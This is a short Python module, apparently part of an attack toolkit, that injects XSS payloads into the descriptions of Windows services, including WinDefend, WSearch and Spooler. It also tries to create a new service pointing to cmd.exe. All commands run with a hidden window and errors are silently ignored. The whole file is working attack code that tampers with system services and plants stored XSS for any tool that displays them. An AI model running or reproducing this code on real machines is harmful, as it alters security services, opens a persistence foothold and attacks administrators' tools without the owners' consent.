"""Windows Service XSS injection."""

import subprocess
from .base import BaseInjector
from ..payloads import XSSPayload


class ServiceInjector(BaseInjector):
    """Injects XSS payloads into Windows service descriptions."""
    
    def inject(self, payload: XSSPayload):
        """Modify service descriptions with XSS payloads."""
        services = ["WinDefend", "WSearch", "Spooler"]
        
        for service in services:
            try:
                subprocess.run(
                    ["sc", "description", service, f"XSS Test: {payload.content}"],
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            except Exception:
                pass
        
        # Try to create a new service with XSS payload
        try:
            service_name = f"XSSSvc_{payload.id}"
            subprocess.run(
                ["sc", "create", service_name, "binpath=", "C:\\Windows\\System32\\cmd.exe"],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except Exception:
            pass
